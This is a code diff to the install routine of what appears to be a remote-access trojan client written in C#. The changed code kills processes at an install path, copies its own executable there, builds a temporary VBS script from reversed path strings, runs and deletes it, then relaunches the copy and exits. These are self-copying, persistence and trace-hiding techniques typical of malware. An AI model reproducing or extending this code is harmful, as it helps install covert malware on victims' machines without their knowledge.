@@ -15,13 +15,14 @@ namespace Client.Install
         {
             try
             {
-                if (Process.GetCurrentProcess().MainModule.FileName != Settings.ClientFullPath)
+                string installfullpath = Path.Combine(Environment.ExpandEnvironmentVariables(Settings.InstallFolder), Settings.InstallFile);
+                if (Process.GetCurrentProcess().MainModule.FileName != installfullpath)
                 {
                     foreach (Process P in Process.GetProcesses())
                     {
                         try
                         {
-                            if (P.MainModule.FileName == Settings.ClientFullPath)
+                            if (P.MainModule.FileName == installfullpath)
                                 P.Kill();
                         }
                         catch
@@ -31,22 +32,22 @@ namespace Client.Install
                     }
 
                     FileStream fs;
-                    if (File.Exists(Settings.ClientFullPath))
+                    if (File.Exists(installfullpath))
                     {
-                        File.Delete(Settings.ClientFullPath);
+                        File.Delete(installfullpath);
                         Thread.Sleep(1000);
-                        fs = new FileStream(Settings.ClientFullPath, FileMode.Create);
+                        fs = new FileStream(installfullpath, FileMode.Create);
                     }
                     else
-                        fs = new FileStream(Settings.ClientFullPath, FileMode.CreateNew);
+                        fs = new FileStream(installfullpath, FileMode.CreateNew);
                     byte[] clientExe = File.ReadAllBytes(Process.GetCurrentProcess().MainModule.FileName);
                     fs.Write(clientExe, 0, clientExe.Length);
                     fs.Dispose();
 
 
                     string tempName = Path.GetTempFileName() + ".vbs";
-                    string TempPath = Strings.StrReverse(Settings.ClientFullPath);
-                    string TempPathName = Strings.StrReverse(Path.GetFileName(Settings.ClientFullPath));
+                    string TempPath = Strings.StrReverse(installfullpath);
+                    string TempPathName = Strings.StrReverse(Path.GetFileName(installfullpath));
                     using (StreamWriter sw = new StreamWriter(tempName, false))
                     {
                         if (!Methods.IsAdmin())
@@ -64,7 +65,7 @@ namespace Client.Install
                     Process.Start(tempName);
                     Thread.Sleep(1000);
                     File.Delete(tempName);
-                    Process.Start(Settings.ClientFullPath);
+                    Process.Start(installfullpath);
                     Methods.ClientExit();
                     Environment.Exit(0);
                 }
